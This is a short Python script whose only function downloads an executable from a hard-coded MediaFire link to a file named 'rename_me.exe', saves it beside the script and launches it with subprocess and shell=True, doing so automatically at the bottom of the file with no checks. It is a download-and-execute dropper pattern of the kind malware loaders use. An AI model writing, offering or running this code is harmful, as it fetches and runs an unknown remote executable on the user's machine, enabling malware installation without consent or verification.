import requests
import os
import subprocess

def download_and_execute(url):
    # Get the directory of the current script
    script_dir = os.path.dirname(os.path.abspath(__file__))
    # Download the executable file
    r = requests.get(url)
    if r.status_code == 200:
        # Save the downloaded file in the script's directory
        file_path = os.path.join(script_dir, "downloaded_file.exe")
        with open(file_path, "wb") as f:
            f.write(r.content)
        # Execute the downloaded file
        subprocess.Popen(file_path, shell=True)
    else:
        print("Failed to download the file.")

# Example usage
download_and_execute("https://download850.mediafire.com/8l0w2wn4h05g1yvDS1xrbpeSYVt91TXnr4VzFottGFiU1IEIhWacmMQy4QWl3ufIptjReSni19Q79UBmAHC45EFH4AGVZTmEKMCQeVAN-YCnZU0W0S0V_zJZc8ukkpSM6jDHnFrb4g2VTV_3yLbJfX4o44yqR26ZeX91QdR7o7tf42I/783t7z3i85vcmql/rename_me.exe")
